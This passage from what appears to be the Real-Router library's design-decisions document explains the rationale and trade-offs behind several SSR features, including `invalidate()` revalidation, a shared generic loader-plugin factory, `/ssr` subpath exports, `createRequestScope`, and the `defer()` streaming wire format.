`#` is the route delimiter in hash-plugin → URL fragments are structurally incompatible. `pluginBuildUrl` accepts `hash` option for typing parity (TS interface merge needs identical signatures across all 3 URL plugins) but ignores it at runtime + emits one-time `console.warn`. Inline `let warned = false` pattern — existing `createWarnOnce` from `shared/browser-env/ssr-fallback.ts` has SSR-specific signature `(context) => (method) => void` and didn't fit.

## `invalidate(router, namespace)` — CSR revalidation channel for SSR loader plugins (#605)

### Problem

Both `ssr-data-plugin` and `rsc-server-plugin` are deliberately **SSR-only by design** — they intercept only `start()`, never `navigate()`. The boot path is the only place fresh data is computed; `state.context.<ns>` is populated once and never refreshed without a full router re-boot. Application code that needed to refresh `state.context.data` after a mutation had only one escape hatch:

```ts
await router.navigate(state.name, state.params, { reload: true });
```

This works for the application-layer subscribe-based fetcher (the RSC example fetches `/__rsc?route=…` on every `TRANSITION_SUCCESS`), but it does **not** re-run the plugin's loader — and it has three distinct downsides for the user:

1. Fires a fake transition: `onTransitionStart` / `onTransitionSuccess` plugins observe a navigation that didn't really happen.
2. Pollutes `logger-plugin` history with "navigation" entries that were really cache-busts.
3. No granularity for multi-namespace routes — a same-route reload is the **only** cache-bust available, and it forces *every* SSR plugin to re-run on this transition (or stay stale, since neither runs).

The parity gap with Nuxt `useAsyncData(...).refresh()` and SolidStart `redirect("/path", { revalidate })` was the most-cited DX delta in the SSR competitive analysis.

### Solution

A `void` (fire-and-forget) helper exported from each plugin:

```ts
import { invalidate } from "@real-router/ssr-data-plugin";

invalidate(router, "data"); // mark stale, do not block

// Composes with the existing core API for an explicit synchronous round-trip:
invalidate(router, "data");
await router.navigate(state.name, state.params, { reload: true });
```

Mechanics:

1. `markStale(router, namespace)` flips a per-router `Set<string>` flag stored in a module-level `WeakMap<Router, Set<string>>` (`shared/ssr/staleRegistry.ts`). Idempotent — `Set.add` deduplicates. Per-router isolation comes for free from the WeakMap key.
2. The plugin's `subscribeLeave` listener — registered once at `usePlugin()` time — peeks the flag (`isStale`) in the awaited LEAVE_APPROVE phase of every navigation. Cheap when no flag is set: a `WeakMap.get` + `Set.has` early-return.
3. **Peek-then-clear-after-write**. The flag is cleared (`clearStale`) only after the loader successfully resolves AND `signal.aborted` is false. Until that point the flag is preserved, so:
   - **No-entry navigation** (route not in the loaders map) — listener no-ops, flag stays.
   - **Client-only / mode-only entry** — mode marker written, no loader call, flag stays.
   - **Cancelled navigation** (newer `navigate()` aborts the older controller) — late-resolving loader sees `signal.aborted`, skips the write, flag stays for the new navigation to consume.
4. Mutations land on `nextRoute.context` directly. Both `state.context` namespaces remain shallowly mutable per the existing claim-write contract — `Object.freeze(toState)` in `completeTransition` is shallow and intentionally leaves `context` extensible.
5. Activation guards run, `completeTransition` fires `TRANSITION_SUCCESS`, subscribers see fresh data.

### Why deferred-to-next, not inject-into-current

If the user calls `invalidate()` from inside a plugin lifecycle hook (`onTransitionStart`) of a navigation already in flight, the cleanest semantics are: "the in-flight transition completes unchanged; the **following** navigation re-runs the loader." This preserves the invariant **one transition = one `state.context` snapshot**, which `logger-plugin` and `validation-plugin` already rely on. Inject-into-current would require those plugins to know about and tolerate mid-transition writes — a large API-surface concession for a small DX gain.

`subscribeLeave` is the right hook because:

- It is the **only** awaited hook in the navigation pipeline (deactivation guards → leave-approve → activation guards → complete). Loader can run async; activation does not start until it resolves.
- It fires **after** the same-state check (`isSameNavigation`) — so `navigate({ reload: true })` to the same path does cross the listener.
- It receives `nextRoute` in the payload — exactly the state we need to mutate before completion.

### Why a free function, not a method on the plugin

Plugin instances are created by `usePlugin(factory)` and managed internally; the application code holds the router, not the plugin. A free `invalidate(router, namespace)` matches the shape of every other escape hatch (`router.navigate`, `cloneRouter`, `getStaticPaths`) and avoids requiring callers to thread a plugin reference through their app.

The `namespace` argument is typed as a literal (`"data"` for ssr-data-plugin, `"rsc"` for rsc-server-plugin) at each plugin's export site, so typos surface at compile time. The literal also serves as in-source documentation at call sites: `invalidate(router, "data")` reads as "refresh the data namespace" without an import jump.

### Trade-offs

- **`subscribeLeave` always registered** — adds one leave listener per loader plugin even when `invalidate()` is never called. Forces `navigate()` onto the "with leave listeners" async path (~5 µs / nav with one no-op listener; see `core` Performance Notes). Acceptable: no-op early-return covers the steady state; lazy-registration would couple the registry to the plugin's lifecycle for a savings most apps will never measure.
- **AbortSignal plumbed into the loader (#605, follow-up)** — `SsrLoaderFn<T>` now accepts an optional second argument `context?: { signal: AbortSignal }`. The leave handler passes the navigation's controller signal so cancellation-aware loaders can abort their in-flight work (fetch, DB query, …). Non-breaking via TypeScript contravariance — existing `(params) => ...` loaders ignore the second arg and still benefit from the post-await `signal.aborted` write-skip. Important pattern: a signal aborted *before* `addEventListener("abort", …)` does NOT auto-fire the listener, so cancellation-aware loaders must check `signal.aborted` upfront (see dogfooding `home` loader in each `ssr-mixed/` example for the canonical shape). The start interceptor does NOT pass a signal — SSR boot path apps that need request-scoped cancellation use the existing `getDep("abortSignal")` pattern from `createRequestScope` (#603) + `withTimeout({ upstreamSignal })` (#598).
- **Cross-namespace not transactional** — calling `invalidate(router, "data")` and `invalidate(router, "rsc")` separately marks both flags, but they are consumed by their respective plugins' independent listeners on the same navigation. There is no "atomic group" — if one loader rejects, the other has already started. Acceptable for the small N of namespaces in practice (data + rsc + at most 1-2 application namespaces); a transactional group would warrant a separate API.
- **Loader rejection leaves flag set** — if `entry.loader(...)` throws, the navigation rejects with that error and the flag is *not* cleared (clearStale runs after `await`). User retries → loader runs again. Matches the existing start-interceptor behavior (no caching of failures).
- **Stale flag survives plugin teardown until the router is GC'd** — the per-router stale registry lives in a module-level `WeakMap<Router, Set<string>>`. `unsubscribe()` removes the **consumer** (the `subscribeLeave` listener) but **not the producer's mark** — a flag set by `invalidate(router, "data")` before `unsub()` remains in the WeakMap entry. Concretely: `invalidate(router, "data"); unsub(); router.usePlugin(ssrDataPluginFactory(loaders)); await router.navigate(...);` — the re-registered listener picks up the pre-existing flag and re-runs the loader. **Intentional for hot-swap scenarios** on long-lived router instances (plugin replacement without re-architecting cache busts). The flag becomes unreachable only when the router itself is GC'd; `cloneRouter()` clones get a fresh registry entry via WeakMap key isolation, so per-request SSR scopes are unaffected. To drop the flag without disposing the router, navigate once to a route with a registered loader and let the listener consume it, OR re-architect to avoid the hot-swap (typical apps don't need this). Documented as a gotcha in both plugins' `CLAUDE.md`.

### Test coverage

13 functional scenarios per plugin (86 tests in ssr-data, 76 in rsc-server with the existing baseline), covering: cross-route re-run, same-route reload, idempotency, no-entry **flag preservation**, client-only mode (mode marker written, flag preserved), no-loader entry (mode marker, flag preserved), function-form `ssr` resolver re-evaluation, loader rejection propagation, single-consumption on success, teardown removes the listener, **cancellation safety** (abort during in-flight loader preserves flag), **namespace isolation** (`markStale` on a foreign namespace ignored by the plugin), **signal propagation** (start interceptor calls loader without context, leave handler passes `{ signal }`), **mid-flight signal abort** (`capturedSignal.aborted` flips synchronously when nav is cancelled), **cancellation-aware loader contract** (loader can `addEventListener("abort", …) → reject(AbortError)` to stop its in-flight work).

### Public-API impact

Non-breaking on the namespace contract. New named export (`invalidate`) on each of two plugins. No changes to `@real-router/types`. No changes to `@real-router/core`. Module augmentation untouched.

**Behavioural change (#605, sources):** `stabilizeState` in `@real-router/sources` now returns `next` whenever `next.transition.reload === true`, even when path and `state.context.url.hash` match `prev`. Without this change, `useRoute()` consumers and any source built atop `createRouteSource` / `createRouteNodeSource` saw a stable snapshot ref on `navigate({ reload: true })` to the same path — so a reload that refreshed `state.context.data` via the plugin's `subscribeLeave` handler did NOT trigger a re-render. Reload is the user's explicit non-idempotent signal; bypassing dedupe matches that semantic.

Two consequences for adapters and examples:
- `useRoute()`, `useRouteNode()`, `useRouterTransition()`, and the Solid/Vue/Svelte/Angular signal/store equivalents now re-emit on every `{ reload: true }` navigation.
- Sources tests previously asserting "second reload preserves snapshot ref" were updated to assert "every reload produces a fresh ref" (`createRouteStore.test.ts`, `createRouteNodeStore.test.ts`, `stabilizeState.test.ts` + parallel adapter tests). Two now-defensive guards (`createRouteNodeSource.ts`, `createTransitionSource.ts`) carry `/* v8 ignore */` annotations — their false branches became structurally unreachable but remain as guards for future stabilizer changes.

### Dogfooding

`mutation → invalidate → reload` is demonstrated end-to-end in **all six** `ssr-mixed/` examples (React, Preact, Solid, Vue, Svelte, Angular). The Home page exposes a `[data-testid="refresh-btn"]` button that calls `invalidate(router, "data") + router.navigate(state.name, state.params, { reload: true })`. The home loader carries a `fetchedAt: Date.now()` field with a 25 ms delay so the e2e cancel-safety scenario reliably crosses leave handlers.

Two e2e scenarios per adapter (12 new tests total + 2 in `ssr-rsc/`):

- **Happy path** — single click → fresh `fetchedAt > initial`. Verifies the loader re-runs and the new value lands on `state.context.data`.
- **In-flight defer** — `page.evaluate(() => { btn.click(); btn.click(); })` fires two synchronous clicks. The second `navigate()` aborts the first via `#abortPreviousNavigation`; with cancel-safety, the first nav's late-resolving loader sees `signal.aborted` and skips the write, the flag stays set, the second nav's leave handler consumes it. End state has fresh `fetchedAt`.

`ssr-rsc/` adds a parallel "Scenario 3b" exercising the same in-flight defer pattern through the `/__rsc` Flight refetch path, with `RevalidateButton` updated to call `invalidate(router, "rsc")` for API symmetry (no-op on the client router in this RSC architecture — server's per-request `cloneRouter` already creates a fresh router each Flight request).

## `shared/ssr/` — third consumer category for the symlink pattern (#437 extension)

### Problem

After `ssr-data-plugin` (#594, plain JSON loader payloads) and `rsc-server-plugin` (#566, `ReactNode` Flight payloads) both shipped, the duplicated surface area between them was significant: identical `start()` interceptor mechanics, identical validation rules (`createLoadersValidator`), identical claim/teardown lifecycle, identical `subscribeLeave` listener for `invalidate()` (#605), identical `SsrMode` resolution, identical typed-error classes (`LoaderRedirect`/`LoaderNotFound`/`LoaderTimeout`), identical `withTimeout` deadline composer, identical `defer({ critical, deferred })` API, identical `__rrDefer__` settle wire format. The only meaningful differences were the namespace string (`"data"` vs `"rsc"`), the loader return type (`unknown` vs `ReactNode`), and the per-route mode subset (`rsc-server-plugin` rejects `"data-only"` because RSC has no "data without component" concept).

Pre-`shared/ssr/`: every shared file would have lived twice — once in `packages/ssr-data-plugin/src/`, once in `packages/rsc-server-plugin/src/`. Drift between the two would have been near-guaranteed; the `rsc-server-plugin` audit (2026-05-10) had already caught two bugs that landed identically in both copies and required parallel fixes.

### Solution

Extend the #437 `shared/` symlink pattern with a third category, `shared/ssr/`. Both plugins consume it via `src/shared-ssr` symlinks (parity with `src/dom-utils` and `src/browser-env`). The barrel exports a **generic factory** `createSsrLoaderPlugin<T, D>` parameterised on the payload type and the dependency map; each plugin instantiates it once:

```typescript
// packages/ssr-data-plugin/src/factory.ts
export const ssrDataPluginFactory = (loaders: SsrLoaderFactoryMap<unknown>) =>
  createSsrLoaderPlugin<unknown>({
    namespace: "data",
    modeNamespace: "ssrDataMode",
    allowedModes: ["full", "data-only", "client-only"],
    validate: createLoadersValidator(ERROR_PREFIX_SSR_DATA),
    loaders,
  });

// packages/rsc-server-plugin/src/factory.ts
export const rscServerPluginFactory = (loaders: RscLoaderFactoryMap) =>
  createSsrLoaderPlugin<ReactNode>({
    namespace: "rsc",
    modeNamespace: "ssrRscMode",
    allowedModes: ["full", "client-only"], // no "data-only"
    validate: createLoadersValidator(ERROR_PREFIX_RSC_SERVER),
    loaders,
  });
```

Symlink layout (parallels #437):

```
packages/ssr-data-plugin/src/shared-ssr   → ../../../shared/ssr           (symlink, git-tracked)
packages/rsc-server-plugin/src/shared-ssr → ../../../shared/ssr           (symlink, git-tracked)
```

`shared/ssr/` contents (8 files):

```
shared/ssr/
├── createSsrLoaderPlugin.ts  # generic factory: compile loop + start interceptor + subscribeLeave + 4-claim teardown
├── createLoadersValidator.ts # generic shape validator (rejects unknown keys, allowed-mode strings only)
├── defer.ts                  # defer({ critical, deferred }) API + DEFER_BRAND symbol + shallow-clone freeze
├── deferRegistry.ts          # __rrDeferRegistry__ global Map + escapeForScript + formatSettleScript + getDeferBootstrapScript
├── errors.ts                 # LoaderRedirect / LoaderNotFound / LoaderTimeout + withTimeout (AbortSignal.any composer)
├── staleRegistry.ts          # markStale / isStale / clearStale — WeakMap<Router, Set<namespace>> for invalidate()
├── types.ts                  # SsrLoaderFn<T> with optional { signal }, SsrLoaderFnFactory<T,D>, SsrMode, SsrLoaderPluginConfig
└── index.ts                  # barrel
```

### Why this is correct as a #437 extension, not a separate mechanism

The shape, tooling concerns, and trade-offs are **identical** to #437:

- Same git-tracked symlink pattern, same Windows requirement (`git config --global core.symlinks true`)
- Same minimal `shared/package.json` (one workspace entry covers all three sibling directories)
- Same coverage trade-off (shared code excluded from per-package 100% — tests live in the consumer that exercises them)
- Same propagation rule: an edit in `shared/ssr/createSsrLoaderPlugin.ts` reflects instantly in both plugins via their symlinks; `pnpm build` verifies both packages
- Same `knip.json` / `.jscpd.json` ignores extended to `shared/ssr/**`

The only #437 carry-over that does NOT apply: `shared/ssr/` consumers don't need `type-guards` resolution (no inlined workspace deps) — the existing `shared/package.json` workspace devDep on `@real-router/core` is sufficient.

### Why a generic factory, not class inheritance or two copies

- **Two-copy approach** rejected: drift is near-guaranteed at this surface area (12+ shared concerns each with non-trivial semantics — see `subscribeLeave` peek-then-clear-after-write logic in `createSsrLoaderPlugin.ts:303-335`, which has 5 distinct bail-out branches)
- **Class inheritance** rejected: plugin factories return `PluginFactory<Deps>` functions, not classes. A `BaseLoaderPlugin` class would invert the natural API shape
- **Generic factory** chosen: zero runtime cost, zero allocation per consumer (the factory closure is created once at module load), full type inference for both `T = unknown` and `T = ReactNode` via TypeScript generics. Both plugins are now ~10-line adapters that validate + delegate

### Audit confirmation

`rsc-server-plugin` audit (2026-05-10 + 2026-05-16) verified composition: both plugins coexist on the same router without cross-namespace mutation, teardown of one does not affect the other, and `invalidate("data")` re-runs only the ssr-data-plugin loader while `state.context.rsc` stays cached. Invariants 14-15 in `packages/rsc-server-plugin/INVARIANTS.md` formalise this contract.

## Subpath isolation for SSR/RSC concerns: `/ssr` entry-point split × 6 adapters (#574 + #609 + #610 + #611)

### Problem

Once SSR primitives (`<ClientOnly>`, `<ServerOnly>`, `<Await>`, `<Streamed>`, `useDeferred`, `<HttpStatusCode>` + `<HttpStatusProvider>` + `createHttpStatusSink`) started shipping in framework adapters, three concerns surfaced:

1. **Type pollution in client components.** A React component file authored for client-only use would get autocompletion for `<HttpStatusCode>` from `@real-router/react` even though the component does nothing meaningful on the client (it writes to a server-side sink that doesn't exist). Tree-shaking removes the dead code from the runtime bundle but TypeScript still suggests the symbol, producing genuine developer confusion ("why is this `<HttpStatusCode>` rendering as `null` in my SPA?").

2. **RSC `react-server` export-condition composition.** React's RSC tooling uses a `react-server` Node export condition to swap the React runtime (different `react/jsx-runtime`, no `useState`/`useEffect`). Adapter packages that ship server-rendered components must either (a) split their entry-points by export condition or (b) pretend the components are isomorphic and break at runtime. Industry alignment: TanStack Router PR #7183 (April 2026) and `react-router@7.x` both adopted the `react-server` condition + thin server-only re-export. Mirroring this puts Real-Router on the same ground.

3. **ESLint enforcement readiness.** Code review caught two cases of `import { HttpStatusCode } from "@real-router/react"` in client components during the `<HttpStatusCode>` Stage 3 rollout. With everything in one entry-point, there is no mechanical rule that catches this — only humans noticing.

### Solution

Every adapter (`react`, `preact`, `solid`, `vue`, `svelte`, `angular`) ships a distinct `@real-router/{adapter}/ssr` subpath alongside the main entry-point. SSR-only components and helpers live exclusively in `/ssr`; the main entry never re-exports them; the `/ssr` entry never depends on history-/navigation-plugin runtime.

```jsonc
// packages/react/package.json (excerpt)
{
  "exports": {
    ".": { /* main: hooks, RouterProvider, Link, RouteView */ },
    "./ssr": {
      "@real-router/internal-source": "./src/ssr/index.ts",
      "react-server": "./src/ssr/index.react-server.ts", // type-only re-export
      "types": "./dist/ssr/index.d.ts",
      "import": "./dist/esm/ssr/index.mjs",
      "require": "./dist/cjs/ssr/index.cjs"
    },
    "./legacy": { /* React 18 fallback, no <Await> */ }
  }
}
```

Symmetric 8-export surface for React/Preact/Vue/Solid/Svelte: `<ClientOnly>`, `<ServerOnly>`, `<Await>`, `<Streamed>`, `useDeferred`, `<HttpStatusCode>`, `<HttpStatusProvider>`, `createHttpStatusSink`. Angular is asymmetric by language: `ClientOnly`, `ServerOnly`, `injectDeferred` (no `<Await>` — Angular has no `<Suspense>`/`use(promise)`), `<http-status-code>` component, `provideHttpStatusSink` env-providers, `HTTP_STATUS_SINK` injection token, `createHttpStatusSink`. Angular's `/ssr` is built as an ng-packagr **secondary entry-point** (`packages/angular/ssr/` with its own `ng-package.json`) because ng-packagr cannot emit a secondary bundle from a `src/ssr/` subdirectory of the primary entry-point.

`@real-router/react/legacy` is preserved alongside `/ssr` for React 18 consumers: no `<Await>` (depends on React 19 `use()`), and the `react-server` condition on the main entry resolves into a type-only re-export so server components can `import type { Navigator, LinkProps }` without dragging client-only runtime in.

### Why per-adapter subpath, not a centralised `@real-router/ssr` package

- **Adapter-native idioms.** `<ClientOnly>` in React uses `useState(false) + useEffect`; in Vue it's `ref(false) + onMounted`; in Solid it's `createSignal(false) + onMount + <Show>`; in Svelte 5 it's `$state(false) + $effect`; in Angular it's `signal(false) + afterNextRender`. Each implementation reaches into framework internals that cannot be abstracted without losing the no-mismatch hydration contract. A central package would have to either (a) wrap all 6 implementations with adapter dispatch (huge surface, single point of failure) or (b) re-export from adapter subpaths anyway (no gain over a direct subpath).
- **Bundle granularity.** Consumers using only the main entry never pay for SSR primitives; `/ssr` imports never pollute the SPA bundle. With a central package this would require careful tree-shaking that bundlers do not guarantee for cross-package boundaries.
- **`react-server` export condition is per-package.** The condition resolves at the package boundary; centralising would force the condition into one package while half the consumers wouldn't use it.

### Trade-offs

- **Six packages, six `package.json` updates per new SSR primitive.** New SSR-side component additions now require coordinated updates across React, Preact, Vue, Solid, Svelte, Angular `package.json` `exports` maps, plus 6 `src/ssr/` directories, plus 6 tsdown/svelte-package/ng-packagr configurations. Mitigated by: (a) symmetric API surface enforced by parallel tests across adapters, (b) the audit cadence already catches drift, (c) common implementation logic lives in `shared/ssr/` (see preceding section).
- **TypeScript `customConditions`.** The internal `@real-router/internal-source` export condition (see `Custom @real-router/internal-source Export Condition` section above) had to be added to every `/ssr` subpath as well, otherwise monorepo `tsc` would resolve `@real-router/react/ssr` to `dist/` artifacts during type-check — slower, and breaks the structural fix from #431.
- **ESLint rule not yet authored.** The rule "no `*/ssr` import in client component file" is mechanically possible but not yet shipped. Tracked separately; the subpath structure makes it implementable as a 10-line `no-restricted-imports` config.

### Composition with `<HttpStatusProvider>` client mount (Vue/Solid asymmetry)

Render-scoped HTTP status sink requires that the client tree match the server tree structurally during hydration. React/Preact/Svelte tolerate `{#if}`-branch asymmetry; Vue (fragment markers `<!--[-->`/`<!--]-->`) and Solid (`data-hk` per-component DOM markers) do not — the client must mount a throwaway `<HttpStatusProvider>` to preserve structural symmetry. Documented in each `/ssr` adapter README; e2e-verified across all six adapters' `ssr/` examples.

## `createRequestScope(req | request, baseRouter, deps?)` — correct-by-construction request-scoped DI (#603)

### Problem

The naive SSR pattern requires four steps per request, each easy to forget:

```typescript
app.use(async (req, res) => {
  const controller = new AbortController(); //                ↓ 1. allocate controller
  req.on("close", () => controller.abort()); //               ↓ 2. wire client-disconnect
  const router = cloneRouter(baseRouter, { //                 ↓ 3. clone with request DI
    abortSignal: controller.signal,
    currentUser: parseCookies(req).user,
  });
  try {
    const state = await router.start(req.url);
    res.send(renderHtml(state));
  } finally {
    await router.dispose(); //                                ↓ 4. teardown
  }
});
```

Each example app re-implemented this. The four hazards are:

1. **Forgetting `req.on("close")`** — long-running loaders continue after the client disconnects, wasting DB connections, upstream API quotas, and event-loop time. Production bug class: a streaming SSR pipeline that never aborts mid-flight `fetch` calls when the user closes their tab.
2. **Forgetting `await router.dispose()`** — accumulating un-disposed routers per request leaks `WeakRef` entries, lifecycle subscriptions, and plugin claims. Detectable only via heap snapshots after thousands of requests.
3. **Order-dependent allocation** — if `cloneRouter` happens before `req.on("close")`, an abort during the clone window leaks the half-initialised router. If `dispose` is not in `finally`, an exception in `start(url)` leaks the router.
4. **Web `Request` vs Node `IncomingMessage` shape divergence** — Edge runtimes (Cloudflare Workers, Vercel Edge, Deno Deploy, Bun) expose Web `Request` with built-in `request.signal`; Node `http.IncomingMessage` does not have `.signal` and requires `.on("close")` + `.removeListener`. Hand-rolling both shapes per app is repetitive and error-prone.

### Solution

One helper from `@real-router/core/utils`:

```typescript
import { createRequestScope } from "@real-router/core/utils";

app.use(async (req, res) => {
  await using scope = createRequestScope(req, baseRouter, {
    currentUser: parseCookies(req).user,
  });
  const state = await scope.router.start(req.url);
  res.send(renderHtml(state));
});
```

Under the hood the helper performs:

1. **`AbortController` allocation** + binding to client-disconnect via `"signal" in req` type-guard: Web `Request` gets `request.signal` chained into the new controller (`AbortSignal.any([request.signal, controller.signal])` — Node 20.3+); Node `IncomingMessage` gets `req.on("close", ...)` plus a `req.removeListener` cleanup hook to satisfy lint and prevent listener leaks on long-running connections.
2. **`cloneRouter(base, { ...deps, abortSignal: controller.signal })`** — the `abortSignal` is auto-injected under the fixed key `"abortSignal"`, so loaders read it via `getDep("abortSignal")` without per-app wiring.
3. **Returns `{ router, dispose }`** plus `Symbol.asyncDispose` so callers on Node 24+ / Bun 1.0.23+ / Deno 1.37+ can use `await using`; on Node 22 LTS the same pattern works via explicit `try/finally + await scope.dispose()`.
4. **Idempotent `dispose`** — calling twice is safe; subsequent calls no-op. Required because `await using` triggers `[Symbol.asyncDispose]` AND the explicit `dispose()` path may be exercised by tests.

### Why a helper, not constructor sugar on `createRouter`

- **`createRouter` is platform-agnostic.** It knows nothing about `req`/`Request`/`AbortController`/`req.on("close")`. Pushing per-request lifecycle into the constructor would force every consumer (Ink, React Native, NativeScript, custom runtimes) to either implement the per-request shape or branch around it.
- **`cloneRouter` already exists** (#287). The natural decomposition is: `cloneRouter` for DI/isolation (used in SSG build scripts, tests, and the helper internals), `createRequestScope` for the request lifecycle wrapper. Keeps each primitive doing one thing.
- **Tests already need the lower-level path.** Unit tests call `cloneRouter(base, deps)` directly with a synthetic `AbortController` — no `req` object exists. Folding everything into one helper would have forced tests to fake a `req` shape.

### Why dual Node `IncomingMessage` / Web `Request` shape

Real-Router targets all current serverless/edge runtimes simultaneously: Vercel Edge, Cloudflare Workers, Deno Deploy, Bun, AWS Lambda, plus traditional Node servers (Express, Fastify, Hono on Node). Forcing app authors to pick one shape would create a fork in example code; supporting both at the helper level keeps the SSR examples uniform across `ssr/`, `ssr-streaming/`, `ssr-mixed/`, `ssg/`, and `ssr-rsc/` directories.

The `"signal" in req` discriminator was chosen over `instanceof Request` because (a) `Request` is not available in Node before v18, (b) testing harnesses inject mocked request objects that don't pass `instanceof`, (c) duck-typing is the canonical JavaScript pattern for cross-runtime shape detection.

### Trade-offs

- **Helper still SSR-only.** On CSR Real-Router uses one `createRouter(deps)` per app session — per-request scope has no meaning when navigation is not a new request. Tests still use `cloneRouter(base, deps)` directly because they don't have a `req`. `createRequestScope` lives in `@real-router/core/utils` (server-side import boundary), not in `@real-router/core/api`.
- **`Symbol.asyncDispose` requires modern runtimes.** Examples document the `try/finally + dispose()` fallback for Node 22 LTS compatibility. Once Node 24 ships LTS (October 2027), the explicit fallback can be removed from example code; the helper continues to support both shapes.
- **Helper does not own response shape.** Whether `start(url)` rejection maps to HTTP 404 / 504 / 302 is the application's concern — see the `LoaderRedirect` / `LoaderNotFound` / `LoaderTimeout` → HTTP mapping in `examples/web/{adapter}/ssr-examples/ssr/server.ts`. The helper composes naturally with these typed errors (via `withTimeout({ upstreamSignal: scope.router.getDep("abortSignal") })`) but doesn't enforce HTTP semantics.

### Dogfooding

Every `entry-server.{ts,tsx}` in `examples/web/{react,preact,vue,solid,svelte,angular}/ssr-examples/{ssr,ssr-streaming,ssr-mixed}/` uses `createRequestScope`. Per-request isolation is verified end-to-end via Playwright scenarios that issue 10 concurrent requests to `/users/:id` with different cookies and assert that each response carries its own `currentUser` — no cross-request leakage. Example anchors: `ssr/` × 10 concurrent (React), `ssr-streaming/` × 9 concurrent, `ssr-rsc/` Scenario 5 × 10 concurrent.

## `defer({ critical, deferred })` formal API + `__rrDefer__` inline-script settle wire (#610)

### Problem

Streaming SSR consumers across the industry need a way to split a loader's payload into two halves: data that **must** be present in the initial HTML (page title, above-the-fold content, anything that affects layout shift or SEO) and data that **can** arrive asynchronously after the shell is delivered (below-the-fold lists, comments, recommendations). Three competing wire formats existed when this was specced:

1. **Remix / React Router 7 framework mode** — `__remixContext.streamController.enqueue(...)` chunks emitted via React's `renderToReadableStream` integration; tightly coupled to RR7's stream renderer.
2. **TanStack Start** — `defer(promise)` + `<Await>` consumer, server pushes serialised promise resolutions through a per-request buffer; tied to TanStack Start's RSC bundler.
3. **Custom in-house wire formats** — each app rolls its own `<script>` tag convention, parser, registry.

Real-Router needed a wire format that (a) is standalone (no framework-mode coupling), (b) survives `react-server-dom-*` bundler swaps, (c) works identically in React, Preact, Vue, Solid, and Svelte adapters (Angular asymmetric via `Signal<T | undefined>`), (d) does not require a client-side parser bundle that runs before the React/Vue/Solid/Svelte hydration entry-point.

### Solution

A formal `defer()` API and an inline-script settle wire that all stream consumers share.

**API surface** (`@real-router/ssr-data-plugin`, also re-exported from `@real-router/rsc-server-plugin`):

```typescript
import { defer } from "@real-router/ssr-data-plugin";

const loader = async (params, { signal }) => {
  const product = await fetchProduct(params.id, { signal }); // critical
  return defer({
    critical: { product },
    deferred: {
      reviews: fetchReviews(params.id, { signal }),     // resolves later
      related: fetchRelated(product.categoryId, { signal }), // resolves later
    },
  });
};
```

The plugin:
- Writes `critical` to `state.context.data` via the existing claim contract — same as a non-deferred loader return.
- Writes the live `deferred` promise record to `state.context.ssrDataDeferred`.
- Writes the keys array to `state.context.ssrDataDeferredKeys` for post-hydration registry reconstruction (so the client can pre-create awaiter slots before the inline scripts arrive).
- Total of **four claims** per loader plugin: `data`, `ssrDataMode`, `ssrDataDeferred`, `ssrDataDeferredKeys` — all released atomically on teardown.

**Wire format** (`shared/ssr/deferRegistry.ts` + `@real-router/ssr-data-plugin/server`):

```html
<!-- Server emits one inline script per deferred key, in resolution order -->
<script>__rrDefer__("reviews", [{"id":1,"text":"…"}])</script>
<script>__rrDefer__("related", [{"id":42,"name":"…"}])</script>
```

The `__rrDefer__` global is installed by `getDeferBootstrapScript()` before the deferred consumer hooks run; it looks up the promise stored in `__rrDeferRegistry__` (a global `Map<string, { promise, resolve, reject }>` populated lazily by `ensureRegistryPromise(key)`) and resolves it.

Errors use a parallel `__rrDeferError__("key", "AbortError: …")` script that rejects the promise; the consumer's error boundary catches it.

**Consumers** — `<Await name>`, `<Streamed fallback>`, `useDeferred()` from `@real-router/{react,preact,solid,vue,svelte}/ssr`. Each adapter implements its idiomatic awaiter: React via `use(promise)` inside `<Suspense>`, Vue via `<Suspense>` + `async setup()`, Solid via `createResource`, Svelte via `{#await}`. Angular asymmetric: `injectDeferred(key)` returns `Signal<T | undefined>` (no native `<Suspense>` / `use(promise)` in Angular's reactivity model).

### Why inline `<script>__rrDefer__(...)</script>`, not Server-Sent Events / WebSocket / fetch streams

- **Zero client parser.** Browsers execute inline `<script>` tags as they're parsed; the registry is populated **before** the client bundle's first instruction. No race between "script loaded enough to register awaiter" and "stream chunk arrived".
- **Industry-aligned format.** Inline-script settle is the de facto standard adopted by Remix, RR7, TanStack Start, and Astro. Bytes on the wire are readable by tools (`curl https://app/page | grep __rrDefer__` shows resolution order).
- **TransformStream-friendly.** `injectDeferredScripts(htmlStream, deferred, options?)` from `@real-router/ssr-data-plugin/server` wraps the framework's HTML stream and emits settle scripts as their promises resolve. Buffering only what `TextEncoder.encode` produces; no per-promise queue, no manual ordering buffer.
- **CSP-aware.** Apps with strict CSP can either (a) use nonce-injected `<script>` (the `bootstrap` option in `InjectDeferredScriptsOptions` supports custom prelude), or (b) replace the entire bootstrap with a static `<script src="/rrDefer.js">` reference. The wire format remains stable.

### Why a formal API in the plugin, not "just await promises in your loader"

Before #610 the supported pattern was "loaders that return objects with `Promise` properties" — the plugin would JSON-serialise the wrapper, which throws because `JSON.stringify(Promise)` is `"{}"`. Each app had to know which keys were promises and route them through a custom serialiser. The formal `defer({ critical, deferred })` API:

- **Brand-tags the return** with `Symbol.for("@real-router/defer")` so the plugin can detect deferred returns without instanceof checks across module boundaries (`Symbol.for` is cross-realm safe — required for tests running in vitest workers, RSC bundler sub-processes, and the SSG build script's separate Node process).
- **Freezes the wrapper shallowly** (`Object.freeze({ critical, deferred, [DEFER_BRAND]: true })`) — a security invariant: `defer()` returns are passed through user code (lifecycle hooks, logger plugin) before the plugin sees them; freezing prevents accidental mutation that would invalidate `state.context.data` shape mid-transition.
- **Rejects reserved keys** at runtime: `"__proto__"`, `"constructor"`, `"prototype"` in `deferred` would corrupt the `__rrDeferRegistry__` Map; rejected with `LoaderRedirect`-style typed error. Validated via PBT (`numRuns: 500`, security-critical).
- **Attaches defensive `.catch(() => {})`** to each deferred promise inside `defer()` itself, before user code sees the wrapper. This prevents `unhandledRejection` from killing the Node process when a deferred promise rejects before its consumer (`<Await>`) attaches a handler. The rejection is still propagated to the consumer via `__rrDeferError__` settle script.

### Trade-offs

- **Wrappable but not transparent.** Loaders that return `defer({ critical, deferred })` cannot also return `null` for "no data" — the plugin treats `defer(...)` as opaque payload. App code that needs conditional defer wraps it as `defer({ critical: { value: null }, deferred: {} })`. Acceptable; conditional defer is rare.
